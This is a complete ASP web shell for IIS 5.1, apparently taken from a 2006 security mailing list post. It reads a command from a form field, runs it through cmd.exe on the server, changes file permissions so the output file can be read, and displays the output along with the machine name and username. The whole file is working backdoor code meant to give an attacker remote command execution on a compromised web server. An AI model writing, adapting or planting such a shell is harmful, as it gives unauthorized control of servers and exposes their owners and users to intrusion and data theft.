<%

' ASP Cmd Shell On IIS 5.1
' brett.moore_at_security-assessment.com 
' http://seclists.org/bugtraq/2006/Dec/0226.html


Dim oS,oSNet,oFSys, oF,szCMD, szTF
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Set oSNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form("C")
If (szCMD <> "") Then
  szTF = "c:\windows\pchealth\ERRORREP\QHEADLES\" &  oFSys.GetTempName()
  ' Here we do the command
  Call oS.Run("win.com cmd.exe /c """ & szCMD & " > " & szTF &
"""",0,True)
  response.write szTF
  ' Change perms
  Call oS.Run("win.com cmd.exe /c cacls.exe " & szTF & " /E /G
everyone:F",0,True)
  Set oF = oFSys.OpenTextFile(szTF,1,False,0)
End If 
%>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
<input type=text name="C" size=70 value="<%= szCMD %>">
<input type=submit value="Run"></FORM><PRE>
Machine: <%=oSNet.ComputerName%><BR>
Username: <%=oSNet.UserName%><br>
<% 
If (IsObject(oF)) Then
  On Error Resume Next
  Response.Write Server.HTMLEncode(oF.ReadAll)
  oF.Close
  Call oS.Run("win.com cmd.exe /c del "& szTF,0,True)
End If 

%>

<!--    http://michaeldaw.org   2006    -->
